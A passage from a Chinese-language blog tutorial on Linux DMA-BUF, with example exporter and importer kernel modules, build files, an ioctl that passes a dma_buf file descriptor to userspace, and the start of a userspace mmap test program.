class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>所有可用操作包括：</p><ul><li><code>attach</code> ：用于建立 dma-buf 与设备间的连接关系，并存放中新创建的 <code>struct dma_buf_attachment</code> 对象中</li><li><code>detach</code> ：</li><li><code>pin</code> ：</li><li><code>unpin</code> ：</li><li><code>map_dma_buf</code> ：</li><li><code>unmap_dma_buf</code> ：</li><li><code>release</code> ：</li><li><code>begin_cpu_access</code> ：</li><li><code>end_cpu_access</code> ：</li><li><code>mmap</code> ：</li><li><code>vmap</code> ：</li><li><code>vunmap</code> ：</li></ul><h1 id="0x02-简易-DMA-BUF-开发"><a href="#0x02-简易-DMA-BUF-开发" class="headerlink" title="0x02. 简易 DMA-BUF 开发"></a>0x02. 简易 DMA-BUF 开发</h1><p>前面讲到 dmabuf 的基本操作序列如下图所示，我们后续将以此为示例进行开发</p><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>需要注意的是 DMA-BUF 相关函数在 <code>DMA_BUF</code> 命名空间中，我们应当在内核模块代码中进行导入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MODULE_IMPORT_NS(DMA_BUF);<br></code></pre></td></tr></table></figure><h2 id="基本的-exporter"><a href="#基本的-exporter" class="headerlink" title="基本的 exporter"></a>基本的 exporter</h2><p>对于 exporter 而言，最重要的是实现 <code>struct dma_buf_ops</code> 中不可或缺的基本操作</p><h3 id="map-dma-buf-：映射-dma-buf-共享内存"><a href="#map-dma-buf-：映射-dma-buf-共享内存" class="headerlink" title="map_dma_buf ：映射 dma-buf 共享内存"></a><code>map_dma_buf</code> ：映射 dma-buf 共享内存</h3><p>该函数指针的作用主要是将 dma-buf 的共享内存进行映射，并将结果写到到一个 <code>sg_table</code> 结构当中，下面是一个最简单的示例，我们假定在此 <code>dma_buf</code> 中已经通过 <code>kmalloc()</code> 分配了内存并存放到 <code>dma_buf::priv</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> sg_table*<br><span class="hljs-title function_">a3exporter_map_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                       <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">table</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">void</span> *err;<br>    <br>    table = kzalloc(<span class="hljs-keyword">sizeof</span>(*table), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!table) &#123;<br>        printk(KERN_ERR<br>               <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for sg_table!\n&quot;</span>);<br>        err = ERR_PTR(-ENOMEM);<br>        <span class="hljs-keyword">goto</span> err_table_no_mem;<br>    &#125;<br><br>    ret = sg_alloc_table(table, <span class="hljs-number">1</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (unlikely(ret)) &#123;    <span class="hljs-comment">/* table will be freed in this function if error */</span><br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate scatterlist!\n&quot;</span>);<br>        err = ERR_PTR(ret);<br>        <span class="hljs-keyword">goto</span> err_sg_alloc;<br>    &#125;<br><br>    buf = attachment-&gt;dmabuf;<br>    sg_dma_len(table-&gt;sgl) = buf-&gt;size;<br>    sg_dma_address(table-&gt;sgl) = dma_map_single(mdev, <span class="hljs-comment">/* cannot be NULL*/</span><br>                                                buf-&gt;priv,<br>                                                buf-&gt;size,<br>                                                direction);<br><br>    <span class="hljs-keyword">if</span> (dma_mapping_error(mdev, sg_dma_address(table-&gt;sgl))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to map for dmabuf!\n&quot;</span>);<br>        err = ERR_PTR(-EFAULT);<br>        <span class="hljs-keyword">goto</span> err_dma_map;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> table;<br><br>err_dma_map:<br>    sg_free_table(table);<br>err_sg_alloc:<br>    kfree(table);<br>err_table_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unmap-dma-buf-：-解除-dma-buf-共享内存映射"><a href="#unmap-dma-buf-：-解除-dma-buf-共享内存映射" class="headerlink" title="unmap_dma_buf ： 解除 dma-buf 共享内存映射"></a><code>unmap_dma_buf</code> ： 解除 dma-buf 共享内存映射</h3><p>这个函数指针的作用主要就是将 <code>sg_table</code> 相关的内存释放掉，并解除掉 dmabuf 的内存映射，下面是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_unmap_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> sg_table *table,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    dma_unmap_single(mdev,<br>                     sg_dma_address(table-&gt;sgl),<br>                     sg_dma_len(table-&gt;sgl),<br>                     direction);<br>    sg_free_table(table);<br>    kfree(table);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="release-：-释放-dma-buf-的内存"><a href="#release-：-释放-dma-buf-的内存" class="headerlink" title="release ： 释放 dma-buf 的内存"></a><code>release</code> ： 释放 dma-buf 的内存</h3><p>该函数指针的作用是真正释放掉 dmabuf 中的内存，下面是一个简单的例子，这里我们假定我们的 dmabuf 中的内存是通过 <code>kmalloc()</code> 进行分配的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf)</span><br>&#123;<br>    kfree(buf-&gt;priv);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="定义-dma-buf"><a href="#定义-dma-buf" class="headerlink" title="定义 dma_buf"></a>定义 <code>dma_buf</code></h3><p>定义了上面这三个函数之后，我们的 <code>dma_buf</code> 的基本功能算是完备了，现在我们可以开始进行 <code>dma_buf</code> 的分配与导出，这里我们给出一个简单的示例，在 exporter 驱动的初始化函数中分配一块常规的内存并包装到 <code>dma_buf</code> 中，为了简化开发流程且方便 importer 驱动使用，这里我们直接将 <code>a3dmabuf</code> 作为一个符号导出：</p><blockquote><p>这里我们在 <code>a3exporter_create_dev()</code> 中创建了一个空白设备节点，仅用作 DMA 占位，其实现比较简单故此处不再给出</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .map_dma_buf    = a3exporter_map_dma_buf,<br>    .unmap_dma_buf  = a3exporter_unmap_dma_buf,<br>    .release        = a3exporter_buf_release,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span> =</span> <span class="hljs-literal">NULL</span>;<br>EXPORT_SYMBOL(a3dmabuf);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3exporter_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> err;<br><br>    err = a3exporter_create_dev();<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to create exporter device, &quot;</span><br>               <span class="hljs-string">&quot;error code: %d\n&quot;</span>, err);<br>        <span class="hljs-keyword">goto</span> err_dev;<br>    &#125;<br><br>    buf = kmalloc(PAGE_SIZE * <span class="hljs-number">8</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for buf!\n&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_buf_no_mem;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">uint64_t</span>*) &amp;buf[PAGE_SIZE * i] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf[PAGE_SIZE * i + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    exp_info.ops    = &amp;a3exporter_dmabuf_ops;<br>    exp_info.size   = PAGE_SIZE * <span class="hljs-number">8</span>;<br>    exp_info.priv   = buf;<br>    exp_info.flags  = O_RDWR | O_CLOEXEC;<br><br>    a3dmabuf = dma_buf_export(&amp;exp_info);<br>    <span class="hljs-keyword">if</span> (IS_ERR(a3dmabuf)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate dma_buf!\n&quot;</span>);<br>        err = PTR_ERR(a3dmabuf);<br>        <span class="hljs-keyword">goto</span> err_exp_info;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] Module initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_exp_info:<br>    kfree(buf);<br>err_buf_no_mem:<br>err_dev:<br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3exporter_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (a3dmabuf) &#123;<br>        dma_buf_put(a3dmabuf);<br>        a3dmabuf = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] See you next time.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="importer-驱动简单示例"><a href="#importer-驱动简单示例" class="headerlink" title="importer 驱动简单示例"></a>importer 驱动简单示例</h2><p>接下来编写测试用的 importer 驱动，要在内核空间中使用一个 <code>dma_buf</code> ，我们只需要如下步骤：</p><ul><li>获取 <code>dma_buf</code> 并增加引用计数，这里注意 <code>dma_buf</code> 的引用计数是通过文件描述符 <code>dma_buf::fd</code> 进行记录的</li><li>将所选设备节点 <code>struct device</code> 给 attach 到 <code>dma_buf</code> 上</li><li>调用 <code>map_dma_buf()</code> 获取 <code>sg_table</code></li></ul><p>接下来直接访问 <code>sg_table-&gt;scatterlist</code> 即可，需要注意的是这里是一个给外设使用的 DMA 地址，而我们只是在内核中测试使用，因此我们需要再转回内核虚拟地址，下面是一个简易的示例 importer 代码核心部分：</p><blockquote><p>以及需要注意的是 DMA-BUF 依赖于设备节点，因此这里我们使用 <code>a3importer_create_dev()</code> 创造一个占位设备，代码比较简单这里不再展开</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/dma-buf.h&gt;</span></span><br><br>MODULE_IMPORT_NS(DMA_BUF);<br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span>;</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3importer_import_dmabuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *<span class="hljs-title">attach</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">dma_data_direction</span> <span class="hljs-title">direction</span> =</span> DMA_BIDIRECTIONAL;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">sgt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sg</span>;</span><br>    <span class="hljs-type">size_t</span> bufsz;<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (!a3dmabuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] No dma_buf got! &quot;</span><br>               <span class="hljs-string">&quot;Exporter not working properly?\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    attach = dma_buf_attach(a3dmabuf, mdev);<br>    <span class="hljs-keyword">if</span> (IS_ERR(attach)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to attach to dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(attach);<br>    &#125;<br><br>    sgt = dma_buf_map_attachment(attach, direction);<br>    <span class="hljs-keyword">if</span> (IS_ERR(sgt)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to map the dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(sgt);<br>    &#125;<br><br>    for_each_sg(sgt-&gt;sgl, sg, sgt-&gt;nents, i) &#123;<br>        buf = (<span class="hljs-type">char</span>*) sg_dma_address(sg) + page_offset_base;<br>        bufsz = sg_dma_len(sg);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> loc = <span class="hljs-number">0</span>; loc &lt; bufsz; loc += PAGE_SIZE) &#123;<br>            printk(KERN_INFO <span class="hljs-string">&quot;[a3importer:] Got data: %s\n&quot;</span>, buf + loc);<br>        &#125;<br>    &#125;<br><br>    dma_buf_unmap_attachment(attach, sgt, direction);<br><br>    dma_buf_detach(a3dmabuf, attach);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3importer_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    barrier();<br>    <span class="hljs-keyword">return</span> a3importer_create_dev() || a3importer_import_dmabuf();<br>&#125;<br></code></pre></td></tr></table></figure><p>Makefile 编写如下，别忘了替换 kernel 路径：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CURRENT_PATH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>LINUX_KERNEL_SRC := your_path_to_kernel_build,e.g.,/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br>CC=clang<br><br><span class="hljs-section">all:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules<br><span class="hljs-section">clean:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br><br></code></pre></td></tr></table></figure><p>Kbuild 编写如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kbuild">EXPORTER_MODULE_NAME ?= exporter-test<br>IMPORTER_MODULE_NAME ?= importer-test<br><br>obj-m += $(EXPORTER_MODULE_NAME).o<br>obj-m += $(IMPORTER_MODULE_NAME).o<br><br>$(EXPORTER_MODULE_NAME)-y += exporter.o<br>$(IMPORTER_MODULE_NAME)-y += importer.o<br></code></pre></td></tr></table></figure><p>测试，成功完成内核驱动间的数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/rXuWZY1g78wjGFK.png"></p><h2 id="importer-应用程序示例"><a href="#importer-应用程序示例" class="headerlink" title="importer 应用程序示例"></a>importer 应用程序示例</h2><p>接下来我们看一种可能更常见的 DMA-BUF 的使用场景：由内核态 exporter 驱动导出给用户态应用程序，在这种场景下 exporter 需要将 <code>dma_buf</code> 通过 <code>dma_buf_fd()</code> 封装到一个 <strong>新分配的文件描述符</strong>当中传递给用户态，用户态再通过 <code>mmap()</code> 映射该文件描述符以使用这块共享内存</p><p><img src="https://s2.loli.net/2024/12/31/JZ95bEQ67OG1V48.png"></p><p>这里我们直接在设备节点的 <code>ioctl()</code> 当中实现该功能，在上面的驱动代码中增加代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">a3exporter_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> args)</span><br>&#123;<br>    <span class="hljs-type">int</span> buf_fd;<br><br>    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    buf_fd = dma_buf_fd(a3dmabuf, O_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (buf_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to allocate new file descriptor.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EMFILE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">void</span>*) args, &amp;buf_fd, <span class="hljs-keyword">sizeof</span>(buf_fd))) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to copy dma_buf fd to userland.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a3exporter_dev_fops</span> =</span> &#123;<br>    .unlocked_ioctl = a3exporter_ioctl,<br></code></pre></td></tr></table></figure><p>此外，由于用户态通过调用 <code>mmap()</code> 来使用这块内存，因此我们还需要在 exporter 驱动当中实现 <code>dma_buf_ops::mmap()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3exporter_buf_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> remap_pfn_range(<br>        vma,<br>        vma-&gt;vm_start,<br>        page_to_pfn(virt_to_page(buf-&gt;priv)),<br>        buf-&gt;size,<br>        vma-&gt;vm_page_prot<br>    );<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .mmap           = a3exporter_buf_mmap,<br></code></pre></td></tr></table></figure><p>下面我们实现 importer 应用程序，我们只需要用 <code>ioctl()</code> 获取 <code>dma_buf</code> 的文件描述符并用 <code>mmap()</code> 进行映射即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd;<br>    <span class="hljs-type">char</span> *buf;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/a3exporter-dev&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(ioctl(dev_fd, <span class="hljs-number">0xdeadbeef</span>, &amp;dma_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to ioctl dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span 